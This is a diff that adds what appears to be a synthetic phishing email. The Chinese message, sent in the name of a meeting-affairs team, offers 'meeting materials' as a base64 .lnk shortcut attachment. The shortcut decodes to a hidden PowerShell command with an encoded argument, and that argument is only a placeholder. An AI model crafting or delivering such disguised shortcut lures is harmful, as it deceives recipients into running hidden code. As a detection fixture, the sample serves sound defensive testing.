@@ -1,0 +1,21 @@
+From: =?utf-8?B?5Lya5Yqh57uE?= <materials@roundtable-docs.example>
+To: research@corp.internal
+Date: Wed, 09 Sep 2026 08:19:00 +0800
+Message-ID: <0009-b17@synth.example>
+Subject: 资料合集快捷方式
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+资料合集已放到共享，附件是入口快捷方式。
+--BS
+Content-Type: application/x-ms-shortcut
+Content-Disposition: attachment; filename="会议资料.lnk"
+Content-Transfer-Encoding: base64
+
+TAAAAAEUAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcG93ZXJzaGVsbCAtdyBoaWRkZW4gLWVuYyBBQUFBAA==
+--BS--
